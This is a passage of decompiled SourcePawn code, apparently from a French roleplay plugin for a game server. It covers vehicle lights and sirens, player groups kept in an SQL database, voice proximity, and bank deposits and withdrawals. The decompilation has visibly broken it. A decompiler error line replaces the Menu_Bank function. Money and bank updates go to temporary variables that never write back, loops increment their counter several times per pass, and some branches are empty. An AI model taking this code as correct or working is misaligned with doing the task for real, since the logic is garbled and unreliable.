		ViewEnt[entity] = sprite;
	}
	if (0 < Driver)
	{
		new car = GetEntPropEnt(Driver, PropType:0, "m_hVehicle", 0);
		decl light;
		buttons2 = GetClientButtons(Driver);
		light = g_CarLights[car][0][0][2];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
			new var2;
			if (buttons2 & 16)
			{
				SetVariantInt(255);
				AcceptEntityInput(light, "ColorGreenValue", -1, -1, 0);
				SetVariantInt(255);
				AcceptEntityInput(light, "ColorBlueValue", -1, -1, 0);
			}
			SetVariantInt(0);
			AcceptEntityInput(light, "ColorGreenValue", -1, -1, 0);
			SetVariantInt(0);
			AcceptEntityInput(light, "ColorBlueValue", -1, -1, 0);
		}
		light = g_CarLights[car][0][0][3];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
			new var3;
			if (buttons2 & 16)
			{
				SetVariantInt(255);
				AcceptEntityInput(light, "ColorGreenValue", -1, -1, 0);
				SetVariantInt(255);
				AcceptEntityInput(light, "ColorBlueValue", -1, -1, 0);
			}
			SetVariantInt(0);
			AcceptEntityInput(light, "ColorGreenValue", -1, -1, 0);
			SetVariantInt(0);
			AcceptEntityInput(light, "ColorBlueValue", -1, -1, 0);
		}
		if (buttons2 & 1)
		{
			if (!CarHorn[Driver][0][0])
			{
				EmitSoundToAll("vehicles/mustang_horn.mp3", entity, 0, 120, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
				CarHorn[Driver] = 1;
				CreateTimer(5, Horn_Time, Driver, 0);
			}
		}
		if (buttons2 & 2)
		{
			light = g_CarLights[car][0][0][0];
			if (IsValidEntity(light))
			{
				AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
			}
			light = g_CarLights[car][0][0][1];
			if (IsValidEntity(light))
			{
				AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
			}
		}
		else
		{
			light = g_CarLights[car][0][0][0];
			if (IsValidEntity(light))
			{
				AcceptEntityInput(light, "HideSprite", -1, -1, 0);
			}
			light = g_CarLights[car][0][0][1];
			if (IsValidEntity(light))
			{
				AcceptEntityInput(light, "HideSprite", -1, -1, 0);
			}
		}
		new speed = GetEntProp(entity, PropType:1, "m_nSpeed", 4, 0);
		new HP = GetEntProp(entity, PropType:1, "m_iHealth", 4, 0);
		PrintHintText(Driver, "Vitesse: %i\nVie: %i", speed, HP);
	}
	return 0;
}

public Action:OnVehicleTakeDamage(victim, &attacker, &inflictor, &Float:damage, &damagetype)
{
	decl String:sVictim[32];
	decl String:sInflictor[32];
	decl String:sWeapon[32];
	GetEdictClassname(victim, sVictim, 32);
	GetEdictClassname(inflictor, sInflictor, 32);
	new var1;
	if (attacker > 0)
	{
		GetClientWeapon(attacker, sWeapon, 32);
	}
	decl Float:Pos1[3];
	decl Float:Pos2[3];
	Pos1[0] = -2552.5;
	Pos1[1] = 1199.5;
	Pos1[2] = -389.5;
	Pos2[0] = -3020;
	Pos2[1] = 584;
	Pos2[2] = -185;
	if (IsbetweenRect(Pos1, Pos2, victim, false))
	{
		damage = 0;
		return Action:1;
	}
	new var2;
	if (attacker == inflictor)
	{
		if (0 < CutRestant[attacker][0][0])
		{
			damage = 1 * damage;
			return Action:1;
		}
		damage = 0;
		return Action:1;
	}
	if (damage > GetEntProp(victim, PropType:1, "m_iHealth", 4, 0))
	{
		new i = 1;
		while (i < MaxClients)
		{
			if (IsClientConnected(i))
			{
				new var3;
				if (CarImpala[i][0][0] != victim)
				{
					if (CarImpala[i][0][0] == victim)
					{
						CarImpalaHP[i] = 0;
					}
					if (CarPoliceImpala[i][0][0] == victim)
					{
						CarPoliceImpalaHP[i] = 0;
					}
					if (CarMustang[i][0][0] == victim)
					{
						CarMustangHP[i] = 0;
					}
					if (CarTacoma[i][0][0] == victim)
					{
						CarTacomaHP[i] = 0;
					}
					if (CarMustangGT[i][0][0] == victim)
					{
						CarMustangGTHP[i] = 0;
					}
					if (CarDirtBike[i][0][0] == victim)
					{
						CarDirtBikeHP[i] = 0;
						i++;
					}
					i++;
				}
				i++;
			}
			i++;
		}
		SetVariantString("Explosion");
		AcceptEntityInput(victim, "DispatchEffect", -1, -1, 0);
		EmitSoundToAll("vehicles/v8/vehicle_impact_heavy1.wav", victim, 0, 90, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
	}
	return Action:0;
}

public ViewToggle(client)
{
	new car = GetEntPropEnt(client, PropType:0, "m_hVehicle", 0);
	decl String:car_ent_name[128];
	GetTargetName(car, car_ent_name, 128);
	if (CarView[client][0][0] == true)
	{
		SetVariantString(car_ent_name);
		AcceptEntityInput(client, "SetParent", -1, -1, 0);
		CarView[client] = 0;
		SetVariantString("vehicle_driver_eyes");
		AcceptEntityInput(client, "SetParentAttachment", -1, -1, 0);
	}
	else
	{
		if (CarView[client][0][0])
		{
		}
		else
		{
			SetVariantString(car_ent_name);
			AcceptEntityInput(client, "SetParent", -1, -1, 0);
			CarView[client] = 1;
			SetVariantString("vehicle_3rd");
			AcceptEntityInput(client, "SetParentAttachment", -1, -1, 0);
		}
	}
	return 0;
}

public LightToggle(client)
{
	new car = GetEntPropEnt(client, PropType:0, "m_hVehicle", 0);
	AcceptEntityInput(g_CarLights[car][0][0][6], "Toggle", -1, -1, 0);
	AcceptEntityInput(g_CarLights[car][0][0][7], "Toggle", -1, -1, 0);
	AcceptEntityInput(g_CarLights[car][0][0][8], "ToggleSprite", -1, -1, 0);
	AcceptEntityInput(g_CarLights[car][0][0][9], "ToggleSprite", -1, -1, 0);
	EmitSoundToAll("buttons/lightswitch2.wav", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
	return 0;
}

public SirenToggle(car, client)
{
	if (IsValidEntity(car))
	{
		decl String:ClassName[256];
		GetEdictClassname(car, ClassName, 255);
		if (StrEqual(ClassName, "prop_vehicle_driveable", true))
		{
			if (CarSiren[car][0][0] == true)
			{
				CarSiren[car] = 0;
				CloseHandle(h_siren_a);
				CloseHandle(h_siren_b);
				CloseHandle(h_siren_c);
				PrintToChat(client, "[L-RP] Sirene desactivee.", client);
				return 0;
			}
			if (CarSiren[car][0][0])
			{
			}
			else
			{
				CarSiren[car] = 1;
				PrintToChat(client, "[L-RP] Sirene activee.", client);
				EmitSoundToAll("vehicles/police_siren_single.mp3", client, 0, 120, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
				h_siren_a = CreateTimer(0.15, A_Time, car, 0);
				h_siren_c = CreateTimer(4.5, C_Time, car, 0);
				return 0;
			}
		}
	}
	return 0;
}

public Action:A_Time(Handle:timer, car)
{
	decl light;
	if (CarSiren[car][0][0] == true)
	{
		light = g_CarLights[car][0][0][4];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
		}
		light = g_CarLights[car][0][0][5];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
		h_siren_b = CreateTimer(0.15, B_Time, car, 0);
	}
	if (!CarSiren[car][0][0])
	{
		light = g_CarLights[car][0][0][4];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
		light = g_CarLights[car][0][0][5];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
	}
	return Action:0;
}

public Action:B_Time(Handle:timer, car)
{
	decl light;
	if (CarSiren[car][0][0] == true)
	{
		light = g_CarLights[car][0][0][4];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
		light = g_CarLights[car][0][0][5];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "ShowSprite", -1, -1, 0);
		}
		h_siren_a = CreateTimer(0.15, A_Time, car, 0);
	}
	if (!CarSiren[car][0][0])
	{
		light = g_CarLights[car][0][0][4];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
		light = g_CarLights[car][0][0][5];
		if (IsValidEntity(light))
		{
			AcceptEntityInput(light, "HideSprite", -1, -1, 0);
		}
	}
	return Action:0;
}

public Action:C_Time(Handle:timer, car)
{
	if (CarSiren[car][0][0] == true)
	{
		new var1;
		if (car > any:0)
		{
			decl String:ClassName[256];
			GetEdictClassname(car, ClassName, 255);
			if (StrEqual(ClassName, "prop_vehicle_driveable", true))
			{
				new Driver = GetEntPropEnt(car, PropType:0, "m_hPlayer", 0);
				if (0 < Driver)
				{
					EmitSoundToAll("vehicles/police_siren_single.mp3", Driver, 0, 120, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
					h_siren_c = CreateTimer(4.5, C_Time, car, 0);
				}
			}
		}
	}
	return Action:0;
}

public Action:Horn_Time(Handle:timer, Driver)
{
	CarHorn[Driver] = 0;
	return Action:0;
}

LeaveVehicle(client)
{
	decl Float:Null[3];
	decl Float:ExitAng[3];
	new vehicle = GetEntPropEnt(client, PropType:0, "m_hVehicle", 0);
	if (IsValidEntity(vehicle))
	{
		GetEntPropVector(vehicle, PropType:1, "m_angRotation", ExitAng, 0);
		ExitAng[0] = 0;
		new var1 = ExitAng[1];
		var1 = 90 + var1;
		ExitAng[2] = 0;
		SDKCall(hLeaveVehicle, client, Null, Null);
		TeleportEntity(client, NULL_VECTOR, ExitAng, NULL_VECTOR);
		SetClientViewEntity(client, client);
		if (IsValidEntity(Cars_Driver_Prop[vehicle][0][0]))
		{
			AcceptEntityInput(Cars_Driver_Prop[vehicle][0][0], "Kill", -1, -1, 0);
			Cars_Driver_Prop[vehicle] = -1;
		}
	}
	return 0;
}

public GetGroupOwner(ID, String:GroupOwner[], maxlen)
{
	decl String:TGroupOwner[128];
	decl String:query[256];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	Format(query, 255, "SELECT * FROM `RP_Groups` WHERE `ID` =  '%i';", ID);
	new Handle:group_owner = SQL_Query(db, query, -1);
	if (group_owner)
	{
		while (SQL_FetchRow(group_owner))
		{
			SQL_FetchString(group_owner, 2, TGroupOwner, 128, 0);
		}
		CloseHandle(group_owner);
	}
	SQL_UnlockDatabase(db);
	strcopy(GroupOwner, maxlen, TGroupOwner);
	CloseHandle(db);
	return 0;
}

public GetGroupName(ID, String:GroupName[], maxlen)
{
	decl String:TGroupName[128];
	decl String:query[256];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	Format(query, 255, "SELECT * FROM `RP_Groups` WHERE `ID` =  '%i';", ID);
	new Handle:group_name = SQL_Query(db, query, -1);
	if (group_name)
	{
		while (SQL_FetchRow(group_name))
		{
			SQL_FetchString(group_name, 1, TGroupName, 128, 0);
		}
		CloseHandle(group_name);
	}
	CloseHandle(db);
	strcopy(GroupName, maxlen, TGroupName);
	return 0;
}

public Action:Command_GroupCreate(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		if (Group[client][0][0])
		{
			PrintToChat(client, "[L-RP] Vous devez quitter votre groupe avant de pouvoir en creer un autre.");
		}
		if (ItemGroup[client][0][0] == 1)
		{
			decl String:arg1[64];
			decl String:SteamID[64];
			GetCmdArg(1, arg1, 64);
			decl String:error[256];
			new Handle:db = SQL_Connect("Roleplay", true, error, 255);
			decl String:query[256];
			SQL_EscapeString(db, arg1, arg1, 64, 0);
			GetClientAuthString(client, SteamID, 64);
			Format(query, 255, "INSERT INTO `RP_Groups` (`Name`, `Owner`) VALUES ('%s', '%s');", arg1, SteamID);
			SQL_FastQuery(db, query, -1);
			ItemGroup[client] = 0;
			Format(query, 255, "SELECT * FROM `RP_Groups` WHERE `Owner` =  '%s';", SteamID);
			new Handle:group_id = SQL_Query(db, query, -1);
			if (group_id)
			{
				while (SQL_FetchRow(group_id))
				{
					Group[client] = SQL_FetchInt(group_id, 0, 0);
				}
				CloseHandle(group_id);
			}
			CloseHandle(db);
			Format(query, 255, "UPDATE `RP_Players` SET `GROUP` = %i WHERE `STEAMID` = '%s';", Group[client], SteamID);
			SQL_FastQuery(db, query, -1);
			PrintToChat(client, "[L-RP] Vous avez creer le groupe %s avec succes !", arg1);
		}
		else
		{
			PrintToChat(client, "[L-RP] Vous devez acheter une creation de groupe avant de pouvoir effectuer cette action.");
		}
	}
	return Action:0;
}

public Action:Command_Group(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new Handle:GroupMenu = CreateMenu(Menu_Group, MenuAction:28);
		if (Group[client][0][0])
		{
			decl String:GroupName[128];
			decl String:SteamID[64];
			decl String:OwnerID[64];
			GetGroupName(Group[client][0][0], GroupName, 128);
			SetMenuTitle(GroupMenu, GroupName);
			AddMenuItem(GroupMenu, "list", "Liste des membres du groupe", 0);
			GetClientAuthString(client, SteamID, 64);
			GetGroupOwner(Group[client][0][0], OwnerID, 64);
			if (StrEqual(SteamID, OwnerID, true))
			{
				AddMenuItem(GroupMenu, "virer", "Virer des membres du groupe", 0);
			}
			else
			{
				AddMenuItem(GroupMenu, "virer", "Virer des membres du groupe", 1);
			}
			AddMenuItem(GroupMenu, "quit", "Quitter le groupe", 0);
		}
		else
		{
			SetMenuTitle(GroupMenu, "Vous n'appartenez a aucun groupe.");
			AddMenuItem(GroupMenu, "create", "Creer un groupe", 0);
		}
		DisplayMenu(GroupMenu, client, 0);
	}
	return Action:0;
}

public Menu_Group(Handle:GroupMenu, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(GroupMenu, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "create", true))
		{
			if (ItemGroup[param1][0][0])
			{
				PrintToChat(param1, "[L-RP] Vous pouvez deja creer un groupe.");
			}
			else
			{
				new Handle:BuyGroup = CreateMenu(Menu_BuyGroup, MenuAction:28);
				SetMenuTitle(BuyGroup, "Confirmez l'achat d'un groupe pour 20000$ ?");
				AddMenuItem(BuyGroup, "Accept", "Accepter l'offre", 0);
				AddMenuItem(BuyGroup, "AcceptCB", "Accepter l'offre et payer par CB", 0);
				AddMenuItem(BuyGroup, "Refuse", "Decliner l'offre", 0);
				DisplayMenu(BuyGroup, param1, 0);
			}
		}
		else
		{
			if (StrEqual(info, "list", true))
			{
				new Handle:GroupList = CreatePanel(Handle:0);
				decl String:OwnerID[64];
				SetPanelTitle(GroupList, "Liste des membres du groupe:", false);
				new i = 1;
				while (i < MaxClients)
				{
					if (IsClientConnected(i))
					{
						if (Group[i][0][0] == Group[param1][0][0])
						{
							decl String:PlayerName[64];
							decl String:SteamID[64];
							new PlayerHP = 0;
							GetClientAuthString(i, SteamID, 64);
							GetGroupOwner(Group[i][0][0], OwnerID, 64);
							PlayerHP = GetClientHealth(i);
							if (StrEqual(SteamID, OwnerID, true))
							{
								Format(PlayerName, 64, "%N - Chef de Groupe - HP:%i", i, PlayerHP);
							}
							else
							{
								Format(PlayerName, 64, "%N - HP:%i", i, PlayerHP);
							}
							DrawPanelItem(GroupList, PlayerName, 0);
							i++;
						}
						i++;
					}
					i++;
				}
				decl String:query[256];
				decl String:error[256];
				new Handle:db = SQL_Connect("Roleplay", true, error, 255);
				Format(query, 255, "SELECT * FROM `RP_Players` WHERE `GROUP` =  %i;", Group[param1]);
				new Handle:group_list = SQL_Query(db, query, -1);
				if (group_list)
				{
					while (SQL_FetchRow(group_list))
					{
						decl String:Pseudo[64];
						decl String:SteamID[64];
						decl String:SteamID2[64];
						new bool:found = 0;
						SQL_FetchString(group_list, 0, SteamID, 64, 0);
						SQL_FetchString(group_list, 2, Pseudo, 64, 0);
						new i = 1;
						while (i < MaxClients)
						{
							if (IsClientConnected(i))
							{
								GetClientAuthString(i, SteamID2, 64);
								if (StrEqual(SteamID, SteamID2, true))
								{
									found = 1;
									i++;
								}
								i++;
							}
							i++;
						}
						if (!found)
						{
							if (StrEqual(SteamID, OwnerID, true))
							{
								Format(Pseudo, 64, "%s - Chef de Groupe - Hors Ligne", Pseudo);
							}
							else
							{
								Format(Pseudo, 64, "%s - Hors Ligne", Pseudo);
							}
							DrawPanelItem(GroupList, Pseudo, 1);
						}
					}
					CloseHandle(group_list);
				}
				CloseHandle(db);
				DrawPanelItem(GroupList, "Fermer", 0);
				SetPanelCurrentKey(GroupList, 10);
				SendPanelToClient(GroupList, param1, Handler_DoNothing, 0);
			}
			if (StrEqual(info, "virer", true))
			{
				new Handle:GroupVirer = CreateMenu(Menu_VirerGroup, MenuAction:28);
				SetMenuTitle(GroupVirer, "Choissisez la personne a virer:");
				decl String:OwnerID[64];
				GetGroupOwner(Group[param1][0][0], OwnerID, 64);
				decl String:query[256];
				decl String:error[256];
				new Handle:db = SQL_Connect("Roleplay", true, error, 255);
				Format(query, 255, "SELECT * FROM `RP_Players` WHERE `GROUP` =  %i;", Group[param1]);
				new Handle:group_virer = SQL_Query(db, query, -1);
				if (group_virer)
				{
					while (SQL_FetchRow(group_virer))
					{
						decl String:Pseudo[64];
						decl String:SteamID[64];
						SQL_FetchString(group_virer, 0, SteamID, 64, 0);
						SQL_FetchString(group_virer, 2, Pseudo, 64, 0);
						if (StrEqual(SteamID, OwnerID, true))
						{
							Format(Pseudo, 64, "%s - Chef de Groupe", Pseudo);
							AddMenuItem(GroupVirer, SteamID, Pseudo, 1);
						}
						else
						{
							Format(Pseudo, 64, "%s", Pseudo);
							AddMenuItem(GroupVirer, SteamID, Pseudo, 0);
						}
					}
					CloseHandle(group_virer);
				}
				CloseHandle(db);
				DisplayMenu(GroupVirer, param1, 0);
			}
			if (StrEqual(info, "quit", true))
			{
				decl String:SteamID[64];
				decl String:OwnerID[64];
				decl String:query[256];
				GetClientAuthString(param1, SteamID, 64);
				GetGroupOwner(Group[param1][0][0], OwnerID, 64);
				if (StrEqual(SteamID, OwnerID, true))
				{
					decl String:error[256];
					new Handle:db = SQL_Connect("Roleplay", true, error, 255);
					Format(query, 255, "DELETE FROM `RP_Groups` WHERE `ID` = %i;", Group[param1]);
					SQL_FastQuery(db, query, -1);
					Format(query, 255, "SELECT * FROM `RP_Players` WHERE `GROUP` =  %i;", Group[param1]);
					new Handle:group_remove = SQL_Query(db, query, -1);
					if (group_remove)
					{
						while (SQL_FetchRow(group_remove))
						{
							SQL_FetchString(group_remove, 0, SteamID, 64, 0);
							Format(query, 255, "UPDATE `RP_Players` SET `GROUP` = '0' WHERE `STEAMID` = '%s';", SteamID);
							SQL_FastQuery(db, query, -1);
						}
						CloseHandle(group_remove);
					}
					CloneHandle(db, Handle:0);
					new i = 1;
					while (i < MaxClients)
					{
						if (IsClientConnected(i))
						{
							if (Group[i][0][0] == Group[param1][0][0])
							{
								Group[i] = 0;
								i++;
							}
							i++;
						}
						i++;
					}
					PrintToChat(param1, "[L-RP] Vous avez supprimer votre groupe.");
				}
				else
				{
					decl String:GroupName[128];
					GetGroupName(Group[param1][0][0], GroupName, 128);
					Group[param1] = 0;
					PrintToChat(param1, "[L-RP] Vous avez quitter le groupe %s", GroupName);
				}
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(GroupMenu);
		}
	}
	return 0;
}

public Menu_VirerGroup(Handle:GroupVirer, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		decl String:query[256];
		new bool:found = 0;
		GetMenuItem(GroupVirer, param2, info, 64, 0, "", 0);
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "UPDATE `RP_Players` SET `GROUP` = 0 WHERE `STEAMID` = '%s';", info);
		SQL_FastQuery(db, query, -1);
		CloseHandle(db);
		new i = 1;
		while (i < MaxClients)
		{
			if (IsClientConnected(i))
			{
				decl String:SteamID[64];
				GetClientAuthString(i, SteamID, 64);
				if (StrEqual(SteamID, info, true))
				{
					found = 1;
					Group[i] = 0;
					PrintToChat(i, "[L-RP] %N vous a vire de son groupe.", param1);
					PrintToChat(param1, "[L-RP] Vous avez vire %N de votre groupe.", i);
					i++;
				}
				i++;
			}
			i++;
		}
		if (!found)
		{
			PrintToChat(param1, "[L-RP] Vous avez virer un joueur de votre groupe.");
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(GroupVirer);
		}
	}
	return 0;
}

public Menu_BuyGroup(Handle:BuyGroup, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(BuyGroup, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "Accept", true))
		{
			if (0 <= money[param1][0][0] + -20000)
			{
				new var1 = money[param1];
				var1 = var1[0][0] + -20000;
				ItemGroup[param1] = 1;
				PrintToChat(param1, "[L-RP] Transaction achevee. Vous pouvez maintenant creer votre groupe en tapant /groupcreate 'nom du groupe'.");
			}
			else
			{
				PrintToChat(param1, "[L-RP] Vous n'avez pas assez d'argent pour finaliser la transaction.");
			}
		}
		else
		{
			if (StrEqual(info, "AcceptCB", true))
			{
				if (0 <= bank[param1][0][0] + -20000)
				{
					new var2 = bank[param1];
					var2 = var2[0][0] + -20000;
					ItemGroup[param1] = 1;
					PrintToChat(param1, "[L-RP] Transaction achevee. Vous pouvez maintenant creer votre groupe en tapant /groupcreate 'nom du groupe'.");
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous n'avez pas assez d'argent pour finaliser la transaction.");
				}
			}
			if (StrEqual(info, "Refuse", true))
			{
				PrintToChat(param1, "[L-RP]Vous avez refuser l'achat d'une creation de groupe.");
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(BuyGroup);
		}
	}
	return 0;
}

public Action:Command_GroupInvite(client, args)
{
	if (IsClientInGame(client))
	{
		decl String:SteamID[64];
		decl String:OwnerID[64];
		GetClientAuthString(client, SteamID, 64);
		GetGroupOwner(Group[client][0][0], OwnerID, 64);
		if (StrEqual(SteamID, OwnerID, true))
		{
			new Ent = GetClientAimTarget(client, true);
			if (Ent != -1)
			{
				if (Group[Ent][0][0])
				{
					PrintToChat(client, "[L-RP] Ce joueur appartient deja a un groupe.");
				}
				else
				{
					decl String:GroupName[128];
					decl String:Title[64];
					decl String:Choose[64];
					GetGroupName(Group[client][0][0], GroupName, 128);
					new Handle:GroupInvit = CreateMenu(Menu_GroupInvit, MenuAction:28);
					Format(Title, 64, "%N souhaite vous inviter dans son groupe(%s):", client, GroupName);
					SetMenuTitle(GroupInvit, Title);
					Format(Choose, 64, "A_%i", client);
					AddMenuItem(GroupInvit, Choose, "Accepter", 0);
					Format(Choose, 64, "R_%i", client);
					AddMenuItem(GroupInvit, Choose, "Refuser", 0);
					DisplayMenu(GroupInvit, Ent, 0);
					PrintToChat(client, "[L-RP] Vous avez inviter %N a rejoindre votre groupe.", Ent);
				}
			}
			else
			{
				PrintToChat(client, "[L-RP] Vous devez viser le joueur a inviter.");
			}
		}
		else
		{
			PrintToChat(client, "[L-RP] Vous n'etes pas le chef du groupe.");
		}
	}
	return Action:0;
}

public Menu_GroupInvit(Handle:GroupInvit, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(GroupInvit, param2, info, 32, 0, "", 0);
		decl String:Buffer[8][32];
		ExplodeString(info, "_", Buffer, 2, 32, false);
		new client = StringToInt(4[Buffer], 10);
		if (StrEqual(Buffer[0][Buffer], "A", true))
		{
			decl String:query[256];
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			decl String:error[256];
			new Handle:db = SQL_Connect("Roleplay", true, error, 255);
			Format(query, 255, "UPDATE `RP_Players` SET `GROUP` = %i WHERE `STEAMID` = '%s';", Group[client], SteamID);
			SQL_FastQuery(db, query, -1);
			CloseHandle(db);
			Group[param1] = Group[client][0][0];
			PrintToChat(param1, "[L-RP] Vous avez integrer le groupe de %N", client);
			PrintToChat(client, "[L-RP] %N a integrer votre groupe.", param1);
		}
		else
		{
			if (StrEqual(Buffer[0][Buffer], "R", true))
			{
				PrintToChat(param1, "[L-RP]Vous avez refuser d'integrer le groupe de %N.", client);
				PrintToChat(client, "[L-RP] %N a refuse d'integrer votre groupe.", param1);
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(GroupInvit);
		}
	}
	return 0;
}

public Action:Timer_UpdateListeners(Handle:timer)
{
	new client = 1;
	while (GetMaxClients() >= client)
	{
		if (IsValidClient(client))
		{
			if (IsPlayerAlive(client))
			{
				check_area(client);
			}
			else
			{
				check_dead(client);
			}
		}
		client++;
	}
	return Action:0;
}

public check_area(client)
{
	if (!IsValidClient(client))
	{
		return 0;
	}
	new id = 1;
	while (GetMaxClients() >= id)
	{
		if (IsValidClient(id))
		{
			if (client == id)
			{
			}
			else
			{
				new VehicleID = GetEntPropEnt(client, PropType:0, "m_hVehicle", 0);
				new VehicleID2 = GetEntPropEnt(id, PropType:0, "m_hVehicle", 0);
				new var1;
				if (VehicleID != -1)
				{
					decl String:CarName[64];
					GetEntPropString(VehicleID2, PropType:1, "m_iName", CarName, 64, 0);
					decl String:Buffer[12][64];
					ExplodeString(CarName, "_", Buffer, 3, 64, false);
					VehicleID2 = StringToInt(Buffer[1], 10);
					if (VehicleID2 == VehicleID)
					{
						SetListenOverride(client, id, ListenOverride:2);
					}
					else
					{
						SetListenOverride(client, id, ListenOverride:1);
					}
				}
				else
				{
					new var2;
					if (entity_distance_stock(client, id) <= 500)
					{
						SetListenOverride(client, id, ListenOverride:2);
					}
					SetListenOverride(client, id, ListenOverride:1);
				}
			}
		}
		id++;
	}
	return 0;
}

public check_dead(client)
{
	if (!IsValidClient(client))
	{
		return 0;
	}
	new id = 1;
	while (GetMaxClients() >= id)
	{
		if (IsValidClient(id))
		{
			if (client == id)
			{
			}
			else
			{
				SetListenOverride(client, id, ListenOverride:1);
			}
		}
		id++;
	}
	return 0;
}

public set_all_listening(client)
{
	new id = 1;
	while (GetMaxClients() >= id)
	{
		new var1;
		if (!IsValidClient(client))
		{
		}
		else
		{
			if (client == id)
			{
			}
			else
			{
				SetListenOverride(client, id, ListenOverride:2);
			}
		}
		id++;
	}
	return 0;
}

public bool:IsValidClient(client)
{
	if (0 >= client)
	{
		return false;
	}
	if (GetMaxClients() < client)
	{
		return false;
	}
	if (!IsValidEdict(client))
	{
		return false;
	}
	if (!IsClientConnected(client))
	{
		return false;
	}
	if (!IsClientInGame(client))
	{
		return false;
	}
	if (!IsClientAuthorized(client))
	{
		return false;
	}
	if (!g_bIsConnected[client][0][0])
	{
		return false;
	}
	return true;
}

BuildBankMenu(client, Ent)
{
	decl String:Buffer[64];
	decl Float:client_vec[3];
	decl Float:ent_vec[3];
	new Float:dist_vec = 0;
	if (Ent)
	{
		GetEntPropVector(Ent, PropType:0, "m_vecOrigin", ent_vec, 0);
		GetClientAbsOrigin(client, client_vec);
		dist_vec = GetVectorDistance(ent_vec, client_vec, false);
	}
	new var1;
	if (Ent)
	{
		new Handle:atm = CreateMenu(Menu_Bank, MenuAction:28);
		SetMenuTitle(atm, "Distributeur:");
		Format(Buffer, 64, "d_%i", Ent);
		AddMenuItem(atm, Buffer, "Deposer", 0);
		Format(Buffer, 64, "r_%i", Ent);
		AddMenuItem(atm, Buffer, "Retirer", 0);
		if (RankID[client][0][0] == 1)
		{
			Format(Buffer, 64, "c_%i", Ent);
			AddMenuItem(atm, Buffer, "Capital", 0);
		}
		Format(Buffer, 64, "i_%i", Ent);
		AddMenuItem(atm, Buffer, "Inventaire", 0);
		DisplayMenu(atm, client, 0);
	}
	return 0;
}


/* ERROR! Unable to cast object of type 'Lysis.LDebugBreak' to type 'Lysis.LConstant'. */
 function "Menu_Bank" (number 333)
public Menu_Deposit(Handle:temp_menu_deposit, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(temp_menu_deposit, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "all", true))
		{
			new var1 = bank[param1];
			var1 = money[param1][0][0] + var1[0][0];
			PrintToChat(param1, "[L-RP] Vous avez deposer %i$.  Vous avez maintenant %i$ dans votre compte bancaire.", money[param1], bank[param1]);
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			LogMessage("%N(%s) a deposer %i$ dans son compte bancaire.", param1, SteamID, money[param1]);
			money[param1] = 0;
			return 0;
		}
		new deposit_amt = StringToInt(info, 10);
		if (money[param1][0][0] >= deposit_amt)
		{
			new var2 = bank[param1];
			var2 = var2[0][0] + deposit_amt;
			PrintToChat(param1, "[L-RP] Vous avez deposer %i$.  Vous avez maintenant %i$ dans votre compte bancaire.", deposit_amt, bank[param1]);
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			LogMessage("%N(%s) a deposer %i$ dans son compte bancaire.", param1, SteamID, deposit_amt);
			new var3 = money[param1];
			var3 = var3[0][0] - deposit_amt;
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(temp_menu_deposit);
		}
	}
	return 0;
}

public Menu_Withdraw(Handle:temp_menu_withdraw, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(temp_menu_withdraw, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "all", true))
		{
			new wallet = bank[param1][0][0] + money[param1][0][0];
			money[param1] = wallet;
			PrintToChat(param1, "[L-RP] Vous avez retirer tout votre argent.");
			decl String:SteamID[64];
			GetClientAuthString(param1, SteamID, 64);
			LogMessage("%N(%s) a retire tout son argent.", param1, SteamID);
			bank[param1] = 0;
			return 0;
		}
		new withdraw_amt = StringToInt(info, 10);
		if (bank[param1][0][0] < withdraw_amt)
		{
			PrintToChat(param1, "[L-RP] Transaction Invalide.");
			return 0;
		}
		new final_cash = money[param1][0][0] + withdraw_amt;
		new var1 = bank[param1];
		var1 = var1[0][0] - withdraw_amt;
